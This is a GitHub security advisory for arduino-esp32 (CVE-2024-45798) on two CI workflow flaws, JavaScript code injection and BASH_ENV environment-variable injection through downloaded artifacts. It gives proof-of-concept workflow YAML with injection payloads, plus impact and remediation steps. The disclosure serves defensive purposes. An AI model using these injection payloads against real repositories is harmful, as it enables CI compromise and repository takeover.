
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fespressif%2Farduino-esp32%2Fsecurity%2Fadvisories%2FGHSA-h52q-xhg2-6jw8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fespressif%2Farduino-esp32%2Fsecurity%2Fadvisories%2FGHSA-h52q-xhg2-6jw8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=espressif%2Farduino-esp32)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[espressif](/espressif)
/
**[arduino-esp32](/espressif/arduino-esp32)**
Public

* [Notifications](/login?return_to=%2Fespressif%2Farduino-esp32) You must be signed in to change notification settings
* [Fork
  7.5k](/login?return_to=%2Fespressif%2Farduino-esp32)
* [Star
   14k](/login?return_to=%2Fespressif%2Farduino-esp32)

* [Code](/espressif/arduino-esp32)
* [Issues
  566](/espressif/arduino-esp32/issues)
* [Pull requests
  15](/espressif/arduino-esp32/pulls)
* [Discussions](/espressif/arduino-esp32/discussions)
* [Actions](/espressif/arduino-esp32/actions)
* [Projects
  2](/espressif/arduino-esp32/projects)
* [Wiki](/espressif/arduino-esp32/wiki)
* [Security](/espressif/arduino-esp32/security)
* [Insights](/espressif/arduino-esp32/pulse)

Additional navigation options

* [Code](/espressif/arduino-esp32)
* [Issues](/espressif/arduino-esp32/issues)
* [Pull requests](/espressif/arduino-esp32/pulls)
* [Discussions](/espressif/arduino-esp32/discussions)
* [Actions](/espressif/arduino-esp32/actions)
* [Projects](/espressif/arduino-esp32/projects)
* [Wiki](/espressif/arduino-esp32/wiki)
* [Security](/espressif/arduino-esp32/security)
* [Insights](/espressif/arduino-esp32/pulse)

# Multiple Poisoned Pipeline Execution (PPE) vulnerabilities

Critical

[lucasssvaz](/lucasssvaz)
published
GHSA-h52q-xhg2-6jw8
Sep 17, 2024

## Package

actions

arduino-esp32
([GitHub Actions](/advisories?query=ecosystem%3Aactions))

## Affected versions

Started in commit 26db8cba32e77050f177e8cb0f879614c57bc5f2

## Patched versions

Fixed in commit a7cec020df8f1a815bd8dfd2559f51a2216bcf1c

## Description

### Summary

`arduino-esp32` CI is vulnerable to multiple Poisoned Pipeline Execution (PPE) vulnerabilities. This affects this repo and any other that might use these workflows.

### Code injection in `tests_results.yml` workflow (`GHSL-2024-169`)

The [`tests_results` workflow](https://github.com/espressif/arduino-esp32/blob/690bdb511d9f001e2066da2dda2c631a3eee270f/.github/workflows/tests_results.yml) is triggered when the `Wokwi tests` workflows completes:

```
on:
  workflow_run:
    workflows: ["Wokwi tests"]
    types:
      - completed
```

It then downloads an artifact uploaded by the triggering workflow into the `artifacts/` directory:

```
- name: Download and Extract Artifacts
uses: dawidd6/action-download-artifact@v6
with:
  run_id: ${{ github.event.workflow_run.id }}
  path: ./artifacts
```

And read the contents of the artifacts into different Environment Variables:

```
```yaml
- name: Get original info
run: |
  original_event=$(cat ./artifacts/parent-artifacts/event.txt)
  original_action=$(cat ./artifacts/parent-artifacts/action.txt)
  original_sha=$(cat ./artifacts/parent-artifacts/sha.txt)
  original_ref=$(cat ./artifacts/parent-artifacts/ref.txt)
  original_conclusion=$(cat ./artifacts/parent-artifacts/conclusion.txt)
  echo "original_event=$original_event" >> $GITHUB_ENV
  echo "original_action=$original_action" >> $GITHUB_ENV
  echo "original_sha=$original_sha" >> $GITHUB_ENV
  echo "original_ref=$original_ref" >> $GITHUB_ENV
  echo "original_conclusion=$original_conclusion" >> $GITHUB_ENV

```

Some of the attacker-controlled variables (such as the `original_ref` variable) are later interpolated into a JavaScript script, enabling an attacker to alter the code of the script and execute arbitrary code in the context of a [high-privileged workflow](https://github.com/espressif/arduino-esp32/actions/runs/10005013308/job/27654848223#step:1:17):

```
- name: Clean up caches
if: always()
uses: actions/github-script@v7
with:
  script: |
    const ref = '${{ env.original_ref }}';
    ...

```
#### PoC

* Clone the repository
* Edit the `tests_wokwi.yml` workflow.

```
name: Wokwi tests

on:
  pull_request:

jobs:
  trigger:
    name: Upload artifact
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p artifacts
          printf "${{ github.sha }}" > artifacts/sha.txt
          printf "pull_request" > artifacts/event.txt
          printf "success" > artifacts/conclusion.txt
          printf "" > artifacts/action.txt
          # PAYLOAD
          printf "foo'; console.log('CODE INJECTION'); //" > artifacts/ref.txt
```

* Create a Pull Request with this change.
* Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Publish and clean test results` workflow which will read the malicious artifact and use its contents to modify the JS script.

#### Impact

This issue may lead to a repository takeover since it will grant an attacker a GITHUB\_TOKEN with the following permissions:

```
  Actions: write
  Checks: write
  Contents: write
  Metadata: read
  PullRequests: write
  Statuses: write

```
#### Remediation

* Verify the contents of the downloaded artifacts.
* Pass data into the JS script using an Environment Variable and read it from JS using `process.env`

### Environment Variable injection (`GHSL-2024-170`)

In the same workflow/step, the untrusted data from an artifact is redirected to GITHUB\_ENV to create a new Environment Variable:

```
- name: Get original info
run: |
  original_event=$(cat ./artifacts/parent-artifacts/event.txt)
  original_action=$(cat ./artifacts/parent-artifacts/action.txt)
  original_sha=$(cat ./artifacts/parent-artifacts/sha.txt)
  original_ref=$(cat ./artifacts/parent-artifacts/ref.txt)
  original_conclusion=$(cat ./artifacts/parent-artifacts/conclusion.txt)
  echo "original_event=$original_event" >> $GITHUB_ENV
  echo "original_action=$original_action" >> $GITHUB_ENV
  echo "original_sha=$original_sha" >> $GITHUB_ENV
  echo "original_ref=$original_ref" >> $GITHUB_ENV
  echo "original_conclusion=$original_conclusion" >> $GITHUB_ENV
```

The `$GITHUB_ENV` pointed file is just a regular file where every `KEY=VALUE` will be used to define a new Environment Variable.

An attacker can send a malicious `event.txt` file (or any of the other artifacts), with the following content:

```
pull_request
BASH_ENV=$(echo "ENV-VAR INJECTION")
```

Which will result in two Environment Variables being defined:

* original\_event=pull\_request
* BASH\_ENV=$(echo "ENV-VAR INJECTION")

The `BASH_ENV` will pollute the bash environment so that next `Run` step will execute the code in the variable.

#### PoC

* Clone the repository
* Edit the `tests_wokwi.yml` workflow.

```
name: Wokwi tests

on:
  pull_request:

jobs:
  trigger:
    name: Upload artifact
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p artifacts
          printf "${{ github.sha }}" > artifacts/sha.txt
          printf "pull_request" > artifacts/event.txt
          printf "success" > artifacts/conclusion.txt
          printf "" > artifacts/action.txt
          # PAYLOAD
          printf "pull_request\nBASH_ENV=$(echo 'ENV-VAR INJECTION')" > artifacts/ref.txt
```

* Create a Pull Request with this change.
* Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Publish and clean test results` workflow which will read the malicious artifact and use its contents to modify the JS script.

#### Impact

This issue may lead to a repository takeover since it will grant an attacker a GITHUB\_TOKEN with the following permissions:

```
  Actions: write
  Checks: write
  Contents: write
  Metadata: read
  PullRequests: write
  Statuses: write

```
#### Remediation

* Verify the contents of the downloaded artifacts.
* Do not allow new lines in the value redirected to GITHUB\_ENV

### Resources

* [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)
* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

### Severity

Critical

### CVE ID

CVE-2024-45798

### Weaknesses

[CWE-20](/advisories?query=cwe%3A20) [CWE-78](/advisories?query=cwe%3A78) [CWE-94](/advisories?query=cwe%3A94)

### Credits

* [![@pwntester](https://avatars.githubusercontent.com/u/125701?s=40&v=4)](/pwntester)
  [pwntester](/pwntester)
  Reporter
* [![@lucasssvaz](https://avatars.githubusercontent.com/u/32426024?s=40&v=4)](/lucasssvaz)
  [lucasssvaz](/lucasssvaz)
  Remediation developer

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

